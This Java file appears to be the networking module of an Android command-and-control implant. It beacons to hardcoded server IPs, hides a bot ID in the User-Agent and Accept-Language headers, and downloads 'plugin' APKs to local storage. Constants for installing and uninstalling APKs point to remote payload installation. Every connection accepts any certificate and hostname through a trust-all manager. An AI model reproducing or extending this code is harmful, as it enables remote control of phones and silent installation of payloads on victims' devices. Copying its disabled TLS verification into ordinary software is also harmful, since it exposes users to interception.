package com.example.Util.phoneback;

import android.util.Log;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Reader;
import java.net.URL;
import java.security.cert.X509Certificate;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class NetworkHelper {
    private static final String TAG = "tluo";
    private static String hostIP = "http://54.147.9.214:5000/";
    private static String upLoadServerUri = hostIP + "api/v1.0/upload";
    private static String cmdServerUri = hostIP + "api/v1.0/cmd";
    private static String ownId = "00000001";
    private static String downloadUri = hostIP + "api/v1.0/download/";
    private static final String ACTION_c2_INSTALL_APK = "com.example.action.ACTION_INSTALL_APK";
    private static final String ACTION_c2_UNINSTALL_APK  = "com.example.action.ACTION_UNINSTALL_APK";
    private static final String ACTION_UNINSTALL_APK_EXTRA_PARAM1 = "APK_PACKAGE_NAME";


    static class https_server {
        private static String protocol = "https";
        private static String hostIP = "118.190.159.86";
        private static String hostPort = "443";
        private static String commandUri = "api/v1.0/cmd";
        private static String downloadUri = "api/v1.0/download";
        private static String ownId = "00000001";

        public static String getC2CommandURL(){
            return protocol + "://" + hostIP + ":" + hostPort + "/" + commandUri;
        }
        public static String getDownloadURL(String filename){
            return protocol + "://" + hostIP + ":" + hostPort + "/" + downloadUri + "/" + filename;
        }
    }

    public NetworkHelper() {
        hostIP = "http://54.147.9.214:5000/";
        upLoadServerUri = hostIP + "api/v1.0/upload";
        cmdServerUri = hostIP + "api/v1.0/cmd";
        downloadUri = hostIP + "api/v1.0/download/";
        ownId = "00000001";
    }

    // Regular C&C Request
    public static String sendCCReq(boolean https){
        try {
            // Create a trust manager that does not validate certificate chains
            TrustManager[] trustAllCerts = new TrustManager[]{
                    new X509TrustManager() {
                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                            return null;
                        }
                        public void checkClientTrusted(X509Certificate[] certs, String authType) {
                        }

                        public void checkServerTrusted(X509Certificate[] certs, String authType) {
                        }
                    }
            };
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HostnameVerifier allHostsValid = new HostnameVerifier() {
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);

            if (https) {
                Log.d(TAG, "C&C Command URI:" + https_server.getC2CommandURL());
                URL url = new URL(https_server.getC2CommandURL());
                HttpsURLConnection httpsConn = (HttpsURLConnection) url.openConnection();
                httpsConn.setRequestMethod("GET");
                httpsConn.setRequestProperty("USER-AGENT", String.format("Mozilla/5.0-%s", https_server.ownId.substring(0, 2)));
                httpsConn.setRequestProperty("ACCEPT-LANGUAGE", String.format("en US-%s", https_server.ownId.substring(2, 8)));
                httpsConn.setReadTimeout(10000 /* milliseconds */ );
                httpsConn.setConnectTimeout(15000 /* milliseconds */ );

                Reader reader = new InputStreamReader(httpsConn.getInputStream());
                String response = "";
                while (true) {
                    int ch = reader.read();
                    if (ch == -1) {
                        break;
                    }
                    response += (char) ch;
                }
                Log.d(TAG, "[tluo] https response:" + response);
                return response;
            }
        } catch (Exception e) {
            e.printStackTrace();
            Log.e(TAG, "Exception : " + e.getMessage(), e);
        }
        return "";
    }


    // Download Plugin
    public static boolean DownloadFile(String filename, String sdCardFilePath, boolean https) {
        try {
            // Create a trust manager that does not validate certificate chains
            TrustManager[] trustAllCerts = new TrustManager[]{
                    new X509TrustManager() {
                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                            return null;
                        }
                        public void checkClientTrusted(X509Certificate[] certs, String authType) {
                        }

                        public void checkServerTrusted(X509Certificate[] certs, String authType) {
                        }
                    }
            };
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HostnameVerifier allHostsValid = new HostnameVerifier() {
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);

            if (https) {
                Log.d(TAG, "Plugin APK Download URI:" + https_server.getDownloadURL(filename));
                URL url = new URL(https_server.getDownloadURL(filename));
                HttpsURLConnection httpsConn = (HttpsURLConnection) url.openConnection();
                httpsConn.setRequestMethod("GET");
                httpsConn.setRequestProperty("USER-AGENT", String.format("Mozilla/5.0-%s", https_server.ownId.substring(0, 2)));
                httpsConn.setRequestProperty("ACCEPT-LANGUAGE", String.format("en US-%s", https_server.ownId.substring(2, 8)));
                httpsConn.setReadTimeout(10000 /* milliseconds */ );
                httpsConn.setConnectTimeout(15000 /* milliseconds */ );

                InputStream input = httpsConn.getInputStream();
                OutputStream output = new FileOutputStream(sdCardFilePath);
                byte data[] = new byte[4096];
                int count;
                while ((count = input.read(data)) != -1) {
                    output.write(data, 0, count);
                }
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
            Log.e(TAG, "Exception : " + e.getMessage(), e);
        }
        return false;
    }
}
